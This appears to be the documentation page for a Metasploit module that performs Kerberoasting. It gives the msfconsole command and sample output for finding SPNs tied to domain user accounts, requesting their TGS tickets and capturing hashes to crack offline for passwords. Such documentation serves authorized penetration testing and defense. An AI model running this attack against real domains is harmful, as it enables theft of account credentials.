## Description

This module will try to find Service Principal Names (SPN) that are associated with normal user accounts on the specified domain and then submit requests to retrive Ticket Granting Service (TGS) tickets for those accounts, which may be partially encrypted with the SPNs NTLM hash. After retrieving the TGS tickets, offline brute forcing attacks can be performed to retrieve the passwords for the SPN accounts.

## Verification Steps

To avoid library/version conflict, it would be useful to have a pipenv virtual environment.

* `pipenv --two && pipenv shell`
* Follow the [impacket installation steps](https://github.com/CoreSecurity/impacket#installing) to install the required libraries.
* Have a domain user account credentials
* `./msfconsole -q -x 'use auxiliary/gather/get_user_spns; set rhosts <dc-ip> ; set smbuser <user> ; set smbpass <password> ; set smbdomain <domain> ; run'`
* Get Hashes

## Scenarios

```
$ ./msfconsole -q -x 'use auxiliary/gather/get_user_spns; set rhosts <dc-ip> ; set smbuser <user> ; set smbpass <password> ; set smbdomain <domain> ; run'
rhosts => <dc-ip>
smbuser => <user>
smbpass => <password>
smbdomain => <domain>
[*] Running for <domain>...
[*] Total of records returned <num>
[+] ServicePrincipalName                              Name        MemberOf                                                                          PasswordLastSet      LastLogon           
[+] ------------------------------------------------  ----------  --------------------------------------------------------------------------------  -------------------  -------------------
[+] SPN...              User...   List...  DateTime... Time... 
[+] $krb5tgs$23$*user$realm$test/spn*$<data>
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
